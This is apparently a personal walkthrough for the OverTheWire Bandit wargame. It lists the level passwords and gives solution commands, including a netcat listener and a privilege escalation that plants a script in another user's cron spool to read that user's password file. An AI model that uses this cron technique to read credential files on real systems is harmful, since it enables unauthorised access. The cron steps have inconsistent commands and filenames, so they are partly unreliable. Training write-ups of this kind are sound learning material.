[Bandit page](https://overthewire.org/wargames/bandit)

| Level | Username | Password |
| - | - | - |
| Level 0 | bandit0 | bandit0 |
| Level 0 -> level 1 | bandit1 | 6y2kwnwK6grgvwvpvLaa2T1cpFEKOhNR |
| Level 1 -> level 2 | bandit2 | PK8fYLZg2hnHSz83plBL1iEPKdD3QToB |
| Level 2 -> level 3 | bandit3 | 7ZZ2LFrykP2zEyvBl4m3clcL7tGYJPME
| Level 3 -> level 4 | bandit4 | xzTXq1rDJQVVAzdv5cHq1TQytTWufAMq |
| Level 4 -> level 5 | bandit5 | 6C7h9GD8M6ai5nr7wo1RonrzFjj9yIrG |
| Level 5 -> level 6 | bandit6 | pXa26xhMWaC2SvDotA4r9EgZkulOeSBW |
| Level 6 -> level 7 | bandit7 | Bmnnvf82KzQlfxgAI2d1zYbr1u9pr3E3 |
| Level 7 -> level 8 | bandit8 | VR1ljMayciFxbnUokuQmJFw6QC9VKtub |
| Level 8 -> level 9 | bandit9 | EjmOSvuAu7sGAHqHVcBDPirRe9T03kxl |
| Level 9 -> level 10 | bandit10 | B0s2khmbT9u0geKuOoVGW3JZKhndE3BG |
| Level 10 -> level 11 | bandit11 | pYfOY6HwUsDj5rL9UvyhU7MCmv8vN5Ro |
| Level 11 -> level 12 | bandit12 | GROozWPO8QyN0mGrjUkID0WCYkZiQxrN |
| Level 12 -> level 13 | bandit13 | qQYQiHOBPR8zR61qxYqX45quvihF2uzk |
| Level 13 -> level 14 | bandit14 | aaWecNkG4FhxJQxz07uiwzVP6bJiYS65 |
| Level 14 -> level 15 | bandit15 | pbLYuZtTg4MgaqfJx8jbA9gKKGqM68A7 |
| Level 15 -> level 16 | bandit16 | kS0Hf0u5HiXFwKMKFqXvPdOTNGGa0X8V |
| Level 16 -> level 17 | bandit17 | Use the ssh key |
| Level 17 -> level 18 | bandit18 | OQxXZjELndr90zuhOTDYBEomI0SZITXI |
| Level 18 -> level 19 | bandit19 | KpsOfPkcP7i1FlIExk2QEjyt6dw8dxZI |
| Level 19 -> level 20 | bandit20 | 4pIjcunZ0fK2vmp3IwfG8Vf7VhxD6pOA |
| Level 20 -> level 21 | bandit21 | bW9kBv5WC3P4yoDyf12LSdGuNz5ka6hY |
| Level 21 -> level 22 | bandit22 | RYVux2rHEm9tiXHmLFzuR7Vhx6AZQMEz |
| Level 22 -> level 23 | bandit23 | gKXDTAXnIz3OBxiPjRZ2uqutUlPZrBsw |
| Level 23 -> level 24 | bandit24 | hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv |

# Level 1 -> level 2

## Problem
Working with filenames starting with dashes and containing spaces

## Solution
1. Add <code>\\</code> before spaces or enclose the filename with <code>'</code> or <code>"</code>
2. Precede the filename by <code>-- </code>

# Level 11 -> level 12

## Problem
Rotate letters by 13 positions

## Solution
<code>cat data.txt | tr 'A-Za-z' 'N-Zn-zA-Ma-m'</code>

# Level 15 -> 16

## Problem
Use SSL/TLS encryption

## Solution
<code>openssl s_client -connect localhost:30001</code>

# Level 16 -> level 17
## Problem
Recover the ssh key for next level

## Solution
<code>openssl s_client -connect localhost:31790 -ign_eof</code>

# Level 20 -> level 21

## Problem
Connection to localhost on a specified port then read the old password of text from the connection to get the new password.

## Solution
1. Open netcat on port 1234
2. Run <code>suconnect</code> on port 1234
3. Type the password on the netcat console

**Alternative**
1. Open netcat on port 1234 with the password pushed on it
```bash
echo -n "<PASSWORD>" | nc -lp 1234 &</code>
```
2. Run <code>suconnect</code> on port 1234

# Level 22 -> Level 24

## Problem
Create a script and run it using a weakness in a cron set up by another user

## Solution
1. Inspect the user cron script
   ```bash
   ls -lha /etc/cron.d/
   ```
2. Read and analyze the content in <code>/etc/cron.d/cronjob_bandit24</code>
   ```bash
   cat /etc/cron.d/cronjob_bandit24
   ```
3. Check the rights for <code>/var/spool/bandit24</code>
   ```bash
   ls -la /var/spool/bandit24  
   ```
4. Create a temporary work directory
   ```bash
   mktemp -d
   ```
5. Create a script `/tmp/tmp.xxxxxxxxxx/script.sh` to write the content of <code>/etc/bandit_pass/bandit24</code> in a readable file
   ```bash
   #!/bin/bash

   cat /etc/bandit_pass/bandit24 > /tmp/tmp.xxxxxxxxxx/password
   ```
6. Make the script executable for bandit24
   ```bash
   chmod 777 /tmp/tmp.xxxxxxxxxx/password
   ```
7. Create `/tmp/tmp.xxxxxxxxxx/password` file and make it writable by all accounts
   ```bash
   touch /tmp/tmp.xxxxxxxxxx/password
   chmod 666 /tmp/tmp.xxxxxxxxxx/password
   ```
8. Copy the script in <code>/var/spool/bandit24/foo</code>
   ```bash
   cp -v /tmp/tmp.xxxxxxxxxx/script.sh /var/spool/bandit24/food
   ```
9. Make the temporary directory fully accessible to all accounts
   ```bash
   chmod 777 /tmp/tmp.xxxxxxxxxx
   ```
10. Survey the content of the destination file while the cron job is run
    ```bash
    tail -f /tmp/tmp.xxxxxxxxxx/password
    ```
